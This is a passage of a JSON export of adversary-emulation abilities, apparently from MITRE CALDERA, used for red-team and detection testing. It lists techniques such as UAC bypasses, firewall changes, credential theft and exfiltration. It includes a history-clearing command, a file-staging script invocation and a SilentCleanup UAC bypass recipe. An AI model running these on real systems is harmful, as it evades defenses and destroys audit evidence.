        "additional_info": {},
        "privilege": "",
        "technique_name": "Automated Collection",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "file_search.sh"
                ],
                "command": "chmod +x ./file_search.sh; ./file_search.sh --extensions '#{linux.included.extensions}'\n --directories '#{linux.included.directories}' --exclude-dir '#{linux.excluded.directories}'\n --accessed '#{file.last.accessed}' --modified '#{file.last.modified}' --search-strings '#{file.sensitive.content}'\n --staging-directory '#{linux.staging.location}' --safe-mode '#{safe.mode.enabled}' --pseudo-ext '#{pseudo.data.identifier}'",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.dir.staged",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [
                    "if [ -d '#{linux.staging.location}' ]; then rm -rf '#{linux.staging.location}/.s'; fi;"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 300
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Advanced File Search and Stager",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9",
        "technique_id": "T1119",
        "repeatable": false
    },
    {
        "description": "This test will attempt to allow an executable through the system firewall located in the Users directory",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Allow Executable Through Firewall Located in Non-Standard Location",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "cfdcd33e3213f9c5a150b8b620d9d0f4",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Allow RDP Remote Assistance Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "c33bd0d7424951f39b73a1f5f491fe17",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Allow SMB and RDP on Microsoft Defender Firewall",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "280003641a5cddf916c4f2bf605a71d3",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: NTFS File Attributes",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Alternate Data Streams (ADS)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "7950c18da2779fa38c0bddeb6d470466",
        "technique_id": "T1564.004",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Ammyy Admin Software Execution",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "08c16e90b1f129f1219361ab95b54f93",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "AnyDesk Files Detected Test on Windows",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "aada5380e7d0a4c7b71f2a324d9d5327",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: PowerShell Profile",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Append malicious start-process cmdlet",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "49a7502f9c667aa3af9c87f6ab1e68b3",
        "technique_id": "T1546.013",
        "repeatable": false
    },
    {
        "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Application Shimming",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Application Shim Installation",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d45d48dbea3384059e638eab6b03abb5",
        "technique_id": "T1546.011",
        "repeatable": false
    },
    {
        "description": "Extracts the names of all open non-explorer windows, and the locations of all explorer windows.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Application Window Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Application Window Discovery",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "5c65eec8-4839-4713-a4e1-86b2e75d1927",
        "technique_id": "T1010",
        "repeatable": false
    },
    {
        "description": "Emulates uninstalling  applications using WMIC.  This method only works if the product was installed with an msi file.  APTs have been seen using this to uninstall security products.",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Application uninstall using WMIC",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "5caa8f9190e3ec3a6f948d70ce67a738",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Applications Installed",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "b5fe84fa9fb8216512867a039a61db20",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: At",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "At.exe Scheduled task",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "1b82e5d4e4707c4923e7a0f8143b3186",
        "technique_id": "T1053.002",
        "repeatable": false
    },
    {
        "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Accessibility Features",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Attaches Command Prompt as a Debugger to a List of Target Processes",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "4bdc05fe2f0006f86575053dc740edf3",
        "technique_id": "T1546.008",
        "repeatable": false
    },
    {
        "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Authentication Package",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Authentication Package",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "2f8f26ef6caacf086dd9b7f7b5031fa5",
        "technique_id": "T1547.002",
        "repeatable": false
    },
    {
        "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Automated AD Recon (ADRecon)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "76155f331bfb00e581a61edbeeafc661",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Automated Collection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Automated Collection Command Prompt",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "8495696b0a75577de442ba54bef343c1",
        "technique_id": "T1119",
        "repeatable": false
    },
    {
        "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Automated Collection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Automated Collection PowerShell",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "0c7c18db582bff4d0da4b4f8fdb2be49",
        "technique_id": "T1119",
        "repeatable": false
    },
    {
        "description": "Stop terminal from logging history",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "> $HOME/.bash_history && unset HISTFILE",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Avoid logs",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bad Potato",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f4ae0566412bb12efb2d03466b4546e7",
        "technique_id": "T1134.001",
        "repeatable": false
    },
    {
        "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Domain Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Basic Permission Groups Discovery Windows (Domain)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "6103e503cb444bc7b4187704f2035708",
        "technique_id": "T1069.002",
        "repeatable": false
    },
    {
        "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Basic Permission Groups Discovery Windows (Local)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "a1f48fa3ddee658b29b414523c9a295b",
        "technique_id": "T1069.001",
        "repeatable": false
    },
    {
        "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (\u201c-k netsvc -p -s BITS\u201d) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "BITS Jobs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bits download using desktopimgdownldr.exe (cmd)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "120efc1cd824a8039d1bde03788cd04a",
        "technique_id": "T1197",
        "repeatable": false
    },
    {
        "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "BITS Jobs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bitsadmin Download (PowerShell)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5a9be3b1696cc0cce8557f9596547e13",
        "technique_id": "T1197",
        "repeatable": false
    },
    {
        "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "BITS Jobs",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bitsadmin Download (cmd)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "31a63c6d775c708f307a784f73e1b410",
        "technique_id": "T1197",
        "repeatable": false
    },
    {
        "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "BlackByte Ransomware Registry Changes - CMD",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e7a987cbef27263e666e5b096488dc55",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "BlackByte Ransomware Registry Changes - Powershell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d2f6cb279552f1b65a9805d63eed1689",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "BlackCat pre-encryption cmds with Lateral Movement",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "c3aaa4585223289f5f29e977253dd045",
        "technique_id": "T1569.002",
        "repeatable": false
    },
    {
        "description": "An adversary tries to modify the windows firewall configuration using the deprecated netsh firewall command (command still works).     \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify System Firewall",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Blackbit - Disable Windows Firewall using netsh firewall",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "eeffd7795c1a6eee8f164531ac80a0fd",
        "technique_id": "T1562.004",
        "repeatable": false
    },
    {
        "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "BrowserStealer (Chrome / Firefox / Microsoft Edge)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "cf4411185e815ccecbe712b46ae2156e",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Guessing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "b2d33bf89e8cd3fa19911b8650804087",
        "technique_id": "T1110.001",
        "repeatable": false
    },
    {
        "description": "Attempts to brute force a single Active Directory account by testing connectivity to the IPC$ share on a domain controller\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Password Guessing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Brute Force Credentials of single Active Directory domain users via SMB",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "09fc509d77ec1ce89738bedeac2e9e3a",
        "technique_id": "T1110.001",
        "repeatable": false
    },
    {
        "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Brute Force: Credential Stuffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Brute Force:Credential Stuffing using Kerbrute Tool",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "e9a13658d13fbb309abf51dce4a71f55",
        "technique_id": "T1110.004",
        "repeatable": false
    },
    {
        "description": "Ensure the ExecutionPolicy is turned to Bypass",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass ExecutionPolicy",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Bypass user account controls - medium",
        "buckets": [
            "privilege-escalation"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC Medium",
        "tactic": "privilege-escalation",
        "plugin": "stockpile",
        "ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC by Mocking Trusted Directories",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "88b05adaded4e793f1bfee0072c72da3",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC using ComputerDefaults (PowerShell)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f91d7dfb1e6fd4fa742f24927ca4af26",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC using Event Viewer (PowerShell)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7440c68b83b6d728b4111d083facefec",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC using Event Viewer (cmd)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "8ad2169ec4d0df6df900f8f8959ad761",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC using Fodhelper",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "0c328b7ec82e0074cbb0745db3a53602",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC using Fodhelper - PowerShell",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "20d68348c822d2947e5a795ac15a22b0",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC using SilentCleanup task",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "55636ecc1eac15ca3c32a9f01626e413",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Bypass UAC using sdclt DelegateExecute",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f782c9b7007a34343faec301b64e7435",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Exfiltrates a file present on the victim machine to the C2 server.\n",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Exfiltration Over C2 Channel",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "C2 Data Exfiltration",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "72784d12700b219ec134aa42cec5603e",
        "technique_id": "T1041",
        "repeatable": false
    },
    {
        "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: CMSTP",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "CMSTP Executing Remote Scriptlet",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d7bfcab15b9612dd53a15a4d8fc73633",
        "technique_id": "T1218.003",
        "repeatable": false
    },
    {
        "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: CMSTP",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "CMSTP Executing UAC Bypass",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a04b2cbd5fa6ea93e8ba16793ec6dc3e",
        "technique_id": "T1218.003",
        "repeatable": false
    },
    {
        "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "COM Hijacking - InprocServer32",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "0e63d76adc58b1d2a1ff6215a64e0a2a",
        "technique_id": "T1546.015",
        "repeatable": false
